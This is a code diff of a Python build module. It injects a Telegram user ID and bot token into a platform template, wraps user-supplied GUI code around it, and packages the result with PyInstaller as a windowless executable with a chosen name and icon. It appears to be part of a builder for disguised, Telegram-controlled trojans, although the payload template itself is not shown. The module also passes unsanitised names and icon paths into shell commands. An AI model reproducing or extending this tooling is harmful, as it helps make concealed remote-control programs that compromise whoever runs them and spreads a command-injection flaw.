@@ -1,43 +1,73 @@
-from colorama import init, Fore, Style
+# import libraries
+from colorama import init, Fore
 from subprocess import getoutput
 from modules import banner
 from time import sleep
+
+# setup the  colorama library
 init()
-def printer(per="0"):
+
+def printer(per="0"): # it print same banner each time and print the percent of executing
+    # clear terminal
     banner.clear()
+    # print same banner each time
     banner.same_banner()
+    # print percent of executing(we get it from input)
     print(Fore.GREEN + f"Creating EXE file({per}%).")
+    # wait for 1 second
     sleep(1)
-def make_python(ID, TOKEN, NAME, CODE_ADDR, OFFLINE_CODE_ADDR, PLATFORM):
+def make_python(ID, TOKEN, NAME, CODE_ADDR, OFFLINE_CODE_ADDR, PLATFORM): # create the python file
+    # read platform code(builder/windows-build.py or linux-build.py)
     with open(PLATFORM, "r") as read: 
         text = read.readlines()
+        # read online code file 
         with open(CODE_ADDR, "r") as read:
             reader = read.readlines()
             reader = "".join(reader)
             reader = reader.split("\n")
-            tkinter_code = """"""
-            for i in reader:
-                tkinter_code += f"    {i}\n"
+            online_code = """"""
+            # read each line of code
+            for line in reader:
+                online_code += f"    {line}\n"
+        # read offline code file
         with open(OFFLINE_CODE_ADDR, "r") as read:
             reader = read.readlines()
             reader = "".join(reader)
             reader = reader.split("\n")
-            offline_tkinter_code = """"""
-            for i in reader:
-                offline_tkinter_code += f"    {i}\n"
-        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code).replace("OFFLINE_TKINTER_CODE", offline_tkinter_code)
+            offline_code = """"""
+            # read each line of code
+            for line in reader:
+                offline_code += f"    {line}\n"
+        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("ONLINE_CODE", online_code).replace("OFFLINE_CODE", offline_code)
+    # make 'output' directory
     getoutput("mkdir output")
+    # make output file with custom name
     with open(f"output/{NAME}.py", "w") as write:
+        # write all of code in file
         write.write(text)
+    # print log
     print(Fore.GREEN + "File is created in /output directory.")
 def make_exe(NAME, ICON): 
+    # print 0%
     printer("0")
+    # make 'exe' directory in 'output' directory
     getoutput("mkdir output/exe")
+    # print 15%
     printer("15")
-    out = getoutput(f"pyinstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py")
+    # start creating the exe file with pyinstaller
+    if "not recognized" in getoutput("pyinstaller"): 
+        out = getoutput(f"PyInstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py")
+    else:
+        out = getoutput(f"pyinstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py")
+    # print 50%
     printer("50")
+    # make exe output log file in log/ directory
     with open("log/pyinstaller-out.txt", "w") as file:
+        # write output
         file.write(out)
+        # print 80%
         printer("80")
+    # print 100%
     printer("100")
+    # print final log
     print(Fore.GREEN + f"\n\n.exe application is created in /output/exe/{NAME}.exe\n{Fore.YELLOW} If not check log/pyinstaller-out.txt")
